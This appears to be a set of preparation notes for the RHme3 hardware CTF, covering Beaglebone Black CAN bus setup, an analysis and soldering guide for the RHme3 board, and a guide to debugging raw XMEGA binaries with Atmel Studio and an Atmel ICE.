# Beaglebone Black CAN setup

This guide will show you how to get ready for working with CAN bus using your Beaglebone Black (BBB).

## Prerequisites

You will need a Linux version for your BBB with *all* of the following:
* BBB device tree source that matches your kernel version
* Kernel version includes SocketCAN
* Python 3.3
* can-utils package

The BBB includes built-in CAN controllers, but you will need CAN transcievers to handle the wire-level protocol.

For reference, I used the following:
* Kali Linux 2017.01 (a flavor of Debian) with kernel version 4.1.30
* Carloop CAN Hitch (transciever)

## Device tree setup

You'll need to follow this section only if you want to use two CAN interfaces (DCAN0 and DCAN1).  This will disable I2C2 from using pins P9.19 and P9.20, which are needed by DCAN0.  You only need to perform the steps in this section once.

Warning: The configuration in this section will disable BBB capes from working.  Each cape has a small I2C EEPROM that stores info that the BBB needs to know in order to communicate with the cape.  Disable I2C2, and the BBB has no way to talk to cape EEPROMs.  Of course, if you don't use capes then this is not a problem.

Acquire DTS sources that matches your kernel version.  Go [here](https://github.com/beagleboard/linux/) and switch over to the branch that represents your kernel version.  Download the entire branch as a ZIP file.  Extract it and do the following (version 4.1 shown as an example):

	# cd ~/src/linux-4.1/arch/arm/boot/dts/include/
	# rm dt-bindings
	# ln -s ../../../../../include/dt-bindings
	# cd ..
	Edit am335x-bone-common.dtsi and ensure the line with "//pinctrl-0 = <&i2c2_pins>;" is commented out.
	# mv am335x-boneblack.dts am335x-boneblack.raw.dts
	# cpp -nostdinc -I include -undef -x assembler-with-cpp am335x-boneblack.raw.dts > am335x-boneblack.dts
	# dtc -W no-unit_address_vs_reg -O dtb -o am335x-boneblack.dtb -b 0 -@ am335x-boneblack.dts
	# cp /boot/dtbs/am335x-boneblack.dtb /boot/dtbs/am335x-boneblack.orig.dtb
	# cp am335x-boneblack.dtb /boot/dtbs/
	Reboot

## Overlay setup

This section describes how to build the device overlays for the two CAN devices (DCAN0 and DCAN1).  You only need to perform the steps in this section once.

Acquire BBB cape overlays, in one of two ways...

	# apt-get install bb-cape-overlays
	https://github.com/beagleboard/bb.org-overlays/

Then do the following:

	# cd ~/src/bb.org-overlays-master/src/arm
	# ln -s ../../include
	# mv BB-CAN1-00A0.dts BB-CAN1-00A0.raw.dts
	# cp BB-CAN1-00A0.raw.dts BB-CAN0-00A0.raw.dts
	Edit BB-CAN0-00A0.raw.dts and make relevant to CAN0.
	# cpp -nostdinc -I include -undef -x assembler-with-cpp BB-CAN0-00A0.raw.dts > BB-CAN0-00A0.dts
	# cpp -nostdinc -I include -undef -x assembler-with-cpp BB-CAN1-00A0.raw.dts > BB-CAN1-00A0.dts
	# dtc -W no-unit_address_vs_reg -O dtb -o BB-CAN0-00A0.dtbo -b 0 -@ BB-CAN0-00A0.dts
	# dtc -W no-unit_address_vs_reg -O dtb -o BB-CAN1-00A0.dtbo -b 0 -@ BB-CAN1-00A0.dts
	# cp *.dtbo /lib/firmware

## Device setup

Do the following each time you need CAN, or automate these steps if you like.

	# echo BB-CAN0 > /sys/devices/platform/bone_capemgr/slots
	# echo BB-CAN1 > /sys/devices/platform/bone_capemgr/slots
	# cat /sys/devices/platform/bone_capemgr/slots
	# modprobe can
	# modprobe can-dev
	# modprobe can-raw
	# ip link set can0 up type can bitrate 50000
	# ip link set can1 up type can bitrate 50000

Note: There is no consistent mapping between DCAN devices and can interface numbers.  You may end up with DCAN0 mapped to can1.  I haven't found a way to control this behavior.

## Hookup guide

	DCAN0 RX: P9.19
	DCAN0 TX: P9.20
	DCAN1 RX: P9.24
	DCAN1 TX: P9.26

Note: Unlike making UART connections, connect RX on the BBB to RX on a CAN transciever, likewise matching TX to TX.

Wiring CAN bus is beyond the scope of this article.  There are plenty of resources out there that describe how to do this.  It basically involves twisted pair wiring, matching up high and low differential lines, and termination resistors.

Once you get everything connected, it should look something like this.

![Double CAN Hookup](../Images/can_hookup_double.jpg)

## Usage

Once you establish a connection, you should be able to test your connection as follows:

	# cansniffer -a can0

If all is good, you should see some CAN traffic.

These are the CAN-related tools that are immediately available on the BBB:

* [SocketCAN/CAN Utils](https://github.com/linux-can/can-utils/blob/master/README.md)
* [Python sockets](http://www.bencz.com/hacks/2016/07/10/python-and-socketcan/)


## References

* [embedded-things.com: Enable CANbus on the Beaglebone Black](http://www.embedded-things.com/bbb/enable-canbus-on-the-beaglebone-black/)
* [electronics.stackexchange.com: Beaglebone Black CAN bus Setup](https://electronics.stackexchange.com/questions/195416/beaglebone-black-can-bus-setup)



### File: rhme3/Preparation/RHme3_board_analysis.md

# RHme3 board analysis and preparation

## Chips

* Atmel XMEGA128A4U
* Microchip MCP25625 (x2): CAN controllers/transcievers
* CH340G: USB-Serial adapter

## Resources

* [ATXMEGA128A4U Support](http://www.microchip.com/wwwproducts/en/ATXMEGA128A4U#1)
* [8/16-bit Atmel XMEGA Microcontroller XMEGA A4U Datasheet, 09/2014](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8387-8-and16-bit-AVR-Microcontroller-XMEGA-A4U_Datasheet.pdf)
* [8-bit Atmel XMEGA AU Microcontroller XMEGA AU MANUAL, 04/2013](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8331-8-and-16-bit-AVR-Microcontroller-XMEGA-AU_Manual.pdf)
* [AVR Instruction Set Manual, 11/2016](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-0856-AVR-Instruction-Set-Manual.pdf)
* [MCP25625 Support](http://www.microchip.com/wwwproducts/en/MCP25625#1)
* [MCP25625 CAN Controller with Integrated Transceiver Datasheet](http://ww1.microchip.com/downloads/en/DeviceDoc/20005282B.pdf)

## Headers and jumpers

* Arduino Uno R3
* PDI (labeled "ICSP")
* CAN H/L
* SJ1 (solder jumper)
* JP4 (labeled "uC/VCC")

### Arduino pinout

A map of board-level connections is useful when probing and identifying signals.

	IO   XMEGA  Most likely               Internal
	pin  pin    function                  connection
	===  =====  ===========               ==========
	RST    35   RESET/PDI_CLK             3V3 pullup
	A0     41   PA1/ADC1/AC1
	A1     42   PA2/ADC2/AC2
	A2     43   PA3/ADC3/AC3
	A3     44   PA4/ADC4/AC4
	A4      1   PA5/ADC5/AC5
	A5      2   PA6/ADC6/AC6
	D0     12   PC2/USARTC0_RX            USB_TX
	D1     13   PC3/USARTC0_TX            USB_RX
	D2     10   PC0/SDA
	D3     11   PC1/SCL
	D4     22   PD2/USARTD0_RX
	D5     23   PD3/USARTD0_TX
	D6     24   PD4/SPID_SS               CAN1_CS
	D7      5   PB2/ADC10/DAC0
	D8      7   PB3/ADC11/DAC1
	D9     14   PC4/SPIC_SS               CAN2_CS
	D10    15   PC5/SPIC_MOSI             CAN2_MOSI
	D11    25   PD5/SPID_MOSI             CAN1_MOSI
	D12    26   PD6/USARTD1_RX/SPID_MISO  CAN1_MISO
	D13    27   PD7/USARTD1_TX/SPID_SCK   CAN1_SCK
	AREF   40   PA0/ADC0/AC0/AREF
	SDA                                   D2
	SCL                                   D3

## Notes

Most of the board can be powered by a 3.3V supply, but the MCP25625 requires a 5V supply to operate the transciever circuits.  Running the MCP25625 at 3.3V won't damage it, but CAN won't work.

The XMEGA does not use an external crystal/resonator.  The internal oscillator is assumed to be running at 16/32 MHz.

The XMEGA communicates with the CAN controllers using SPI.

XMEGA does not support ICSP.  The port labeled "ICSP" is actually a PDI port.  You will need a programmer/debugger that supports PDI in order to use this port (e.g. Atmel ICE).  Note: Not used for CTF.

## Avrdude preparation

Bridge the gap across SJ1 with a blob of solder.  This will connect the DTR pin on the CH340G to the ~RESET pin on the XMEGA.  This will allow avrdude to automatically reset the board to initiate programming.

![RHme3 board](../Images/rhme3_board.jpg)

## CAN preparation

Solder jumper headers at CAN H and CAN L.

To support independant CAN channels, cut the traces connecting the two CAN channels, as follows:
* Using a small screwdriver, gently remove the black header base from the CAN H jumper pins.
* Attach a multimeter across channels 1 and 2 on CAN H.  Put multimeter into tone continuity mode.
* Gently score the CAN H trace between channels 1 and 2 with a hobby knife until the continuity tone stops.
* Put the black header base back onto the jumper pins.
* Repeat all steps with CAN L.

To operate connected ECUs: Put a jumper on the header pins across each trace that you cut.

To operate disconnected ECUs: Remove the jumpers.

![Cutting CAN trace](../Images/cutting_can_trace.jpg)

## SCA/FI preparation

Remove the three 100 nF capacitors C7, C16 and C17.

Solder a jumper header at JP4.

![RHme3 board](../Images/rhme3_board.jpg)

Cut the trace connecting the two pins of JP4, as follows:
* Attach a multimeter to both pins of JP4.  Put multimeter into tone continuity mode.
* Turn board over.  The trace to cut is on the back of the board.
* Gently score the trace with a hobby knife until the continuity tone stops.

For normal use: Put a jumper onto the header pins at JP4.

For SCA/FI: replace the jumper at JP4 with a shunt circuit.



### File: rhme3/Preparation/debugging_raw_binaries.md

# Debugging AVR XMEGA raw binaries

Why use a simulator when you can use the real thing?  This guide shows how to set up an AVR XMEGA under the control of a hardware debugger, and set up to debug raw binaries on it (stripped of debugging symbols).

## Prerequisites

This guide makes use of the following items:
* Atmel Studio 7
* Atmel ICE (PDI hardware debugger)
* Atmel XMEGA128A4U mounted on TQFP-44 breakout board
* Small breadboard
* 100 nF ceramic capacitors (x4)
* Jumper wires
* 3.3V USB-Serial adapter

If your reversing a binary that requires the use of a crystal, you'll need to add that along with two 22 pF capacitors.  The RHme3 CTF binaries use the XMEGA internal oscillator, so nothing else is needed.

## Hardware setup

These are the pins that you'll use on the XMEGA.  The pinout is given in section 2 of the XMEGA A4U Datasheet [1].
*  8:  Gnd
*  9:  Vcc
* 12:  USARTC0 RX
* 13:  USARTC0 TX
* 18:  Gnd
* 19:  Vcc
* 30:  Gnd
* 31:  Vcc
* 34:  PDI Data
* 35:  PDI CLock
* 38:  Gnd
* 39:  AVcc

Plug your XMEGA breakout board onto a breadboard and make the following connections:
* 100 nF capacitor between each pair of XMEGA pins 8 and 9, 18 and 19, 30 and 31, 38 and 39
* Gnd rail on breadboard to XMEGA pins 8, 18, 30, 38
* 3V3 rail on breadboard to XMEGA pins 9, 19, 31, 39
* USB-Serial Gnd to Gnd rail on breadboard
* USB-Serial 3V3 to 3V3 rail on breadboard (as a power source)
* USB-Serial TX to XMEGA pin 12
* USB-Serial RX to XMEGA pin 13
* Atmel ICE pin 2 to Gnd rail on breadboard
* Atmel ICE pin 3 to XMEGA pin 34
* Atmel ICE pin 4 to 3V3 rail on breadboard (as a voltage reference)
* Atmel ICE pin 6 to XMEGA pin 35

Here's what it should look like when you put it all together.  Other items are optional and depend on the binary that you're debugging.  If you add more components, be sure not to exceed the current capacity of the USB-Serial adapter.

![XMEGA](../Images/xmega.jpg)

## Disassembling a raw binary

Do the following to convert and disassemble a HEX file:

	$ avr-objcopy -I ihex -O elf32-avr demo.hex demo.elf
	$ avr-objdump -D demo.elf > demo.asm

## Setting up the debugger for a raw binary

Do the following to load a HEX file into Atmel Studio 7 and debug it on XMEGA hardware:

Create the project as follows:
1. Select the menu item: File > Open > Open Object File For Debugging.
2. Select the HEX file and name the project, then click Next.

![AS7 Open Object File 1 of 2](../Images/as7_open_object_file_1.png)

3. Select XMEGAA, then select ATxmega128A4U, then click Finish.

![AS7 Open Object File 2 of 2](../Images/as7_open_object_file_2.png)

Program the device as follows:
1. Select the menu item: Tools > Device Programming.
2. Select the following: Tool = Atmel-ICE, Device = ATxmega128A4U, Interface = PDI, then click Apply.
3. Click Read and verify that you get a device signature and the correct target voltage.

![AS7 Device Programming 1 of 2](../Images/as7_device_programming_1.png)

4. Go to the Memories tab.
5. Select the HEX file in the flash section, and click Program.
6. Ensure that you get "Verifying Flash...OK", then click Close.

![AS7 Device Programming 2 of 2](../Images/as7_device_programming_2.png)

Adjust the project for hardware debugging as follows:
1. Select the menu item: Project > Properties.
2. Go to the Tool tab.
3. Select Debugger/Programmer = Atmel-ICE, and Interface = PDI.
4. Set Programming settings = Skip programming.

![AS7 Project Properties](../Images/as7_project_properties.png)

Now use "File > Save All" to save the project.

This process creates a project.  You can use "File > Open > Project/Solution" and "File > Close Solution" to open and close the project.

The project is now ready for debugging.  Use "Debug > Start Debugging and Break" to get started.

## References

1. [8/16-bit Atmel XMEGA Microcontroller XMEGA A4U Datasheet, 09/2014](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8387-8-and16-bit-AVR-Microcontroller-XMEGA-A4U_Datasheet.pdf)

